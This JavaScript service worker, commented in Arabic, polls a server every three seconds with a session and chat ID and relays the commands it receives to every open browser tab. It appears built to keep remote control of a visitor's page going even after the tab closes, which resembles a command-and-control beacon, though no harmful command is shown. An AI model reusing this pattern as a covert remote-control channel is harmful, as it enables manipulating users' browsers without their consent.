// sw.js - Service Worker للجلسة 24 ساعة
const CACHE_NAME = 'lsh-v1';
const PING_INTERVAL = 3000; // 3 ثواني
const SESSION_KEY = 'lsh_session_data';

let sessionData = null;
let pingTimer = null;

// ============================================================
// تثبيت SW
// ============================================================
self.addEventListener('install', (event) => {
  console.log('[SW] Installing...');
  self.skipWaiting();
});

self.addEventListener('activate', (event) => {
  console.log('[SW] Activated');
  event.waitUntil(self.clients.claim());
});

// ============================================================
// استقبال رسائل من الصفحة الرئيسية
// ============================================================
self.addEventListener('message', (event) => {
  const data = event.data || {};
  console.log('[SW] Message:', data.type);

  if (data.type === 'init') {
    // تهيئة الجلسة
    sessionData = {
      session_id: data.session_id,
      chat_id: data.chat_id,
      http_url: data.http_url,
      started_at: Date.now()
    };
    startPing();
    console.log('[SW] Session initialized:', sessionData.session_id);
  }

  if (data.type === 'stop') {
    stopPing();
  }

  if (data.type === 'keepalive') {
    // الصفحة تخبرنا أنها لا تزال مفتوحة
    if (sessionData) {
      sessionData.last_page_seen = Date.now();
    }
  }
});

// ============================================================
// Ping Loop — يستمر حتى لو الصفحة مغلقة
// ============================================================
function startPing() {
  if (pingTimer) clearInterval(pingTimer);
  pingTimer = setInterval(doPing, PING_INTERVAL);
  // أول ping فوري
  doPing();
}

function stopPing() {
  if (pingTimer) {
    clearInterval(pingTimer);
    pingTimer = null;
  }
}

async function doPing() {
  if (!sessionData) return;

  try {
    const resp = await fetch(sessionData.http_url + '/lsh_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionData.session_id,
        chat_id: sessionData.chat_id,
        type: 'sw_ping',
        ts: Date.now()
      })
    });

    if (!resp.ok) return;

    const data = await resp.json();
    const commands = data.commands || [];

    // أرسل الأوامر لكل التابات المفتوحة
    if (commands.length > 0) {
      const clients = await self.clients.matchAll({ includeUncontrolled: true });
      clients.forEach(client => {
        client.postMessage({
          type: 'commands',
          commands: commands
        });
      });

      // إذا لم يكن هناك تاب مفتوح، نفذ الأوامر البسيطة مباشرة
      if (clients.length === 0) {
        for (const cmd of commands) {
          await handleCommandWithoutTab(cmd);
        }
      }
    }
  } catch (e) {
    // فشل الشبكة — أعد المحاولة في الدورة التالية
    console.log('[SW] Ping failed:', e.message);
  }
}

// ============================================================
// تنفيذ أوامر بسيطة بدون تاب (احتياطي)
// ============================================================
async function handleCommandWithoutTab(cmd) {
  // فقط الأوامر التي لا تحتاج UI
  if (cmd.action === 'ping') return;

  // أرسل تنبيه للسيرفر أن التاب مغلق
  try {
    await fetch(sessionData.http_url + '/lsh_msg', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        session_id: sessionData.session_id,
        chat_id: sessionData.chat_id,
        type: 'cmd_no_tab',
        action: cmd.action,
        ts: Date.now()
      })
    });
  } catch (e) {}
}

// ============================================================
// استقبال Push (احتياطي)
// ============================================================
self.addEventListener('push', (event) => {
  console.log('[SW] Push received');
  event.waitUntil(doPing());
});

// ============================================================
// Background Sync
// ============================================================
self.addEventListener('sync', (event) => {
  console.log('[SW] Sync event:', event.tag);
  if (event.tag === 'lsh-ping') {
    event.waitUntil(doPing());
  }
});

// ============================================================
// Fetch — تمرير الطلبات عبر SW (لتخزينها مؤقتاً)
// ============================================================
self.addEventListener('fetch', (event) => {
  // نمرر كل الطلبات بشكل طبيعي
  event.respondWith(fetch(event.request).catch(() => {
    return new Response('offline', { status: 503 });
  }));
});
